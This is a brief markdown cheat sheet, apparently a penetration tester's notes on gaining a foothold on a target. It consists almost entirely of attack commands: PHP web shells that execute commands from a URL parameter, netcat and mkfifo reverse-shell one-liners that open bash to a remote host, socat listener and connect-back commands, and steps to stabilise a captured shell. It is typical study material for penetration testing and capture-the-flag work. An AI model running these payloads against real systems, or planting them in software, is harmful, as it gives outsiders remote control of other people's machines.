# foothold

## Web shells

- A simple PHP web shell.

```shell
<?php system($_GET['cmd']); ?>
```

```shell
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- The well known pentestmonkey php reverse shell [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

- A list of reverse shell payloads [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
Common payloads include

```
nc ip 1234 -e /bin/bash
```
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ip 1234 >/tmp/f
```

## Socat

Listener

```shell
socat TCP-L:1234 FILE:`tty`,raw,echo=0 
```

Connect back to listener

```shell
socat TCP:me:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Netcat

- Stabilize your shell using

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

or (depending on Python version available)

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

```shell
alias ls='ls --color=auto'
export TERM=xterm
```

- Set up autocomplete. Background the shell using `CTRL + Z` and run 

```shell
stty raw -echo; fg
```
to foreground the shell using tab completion.

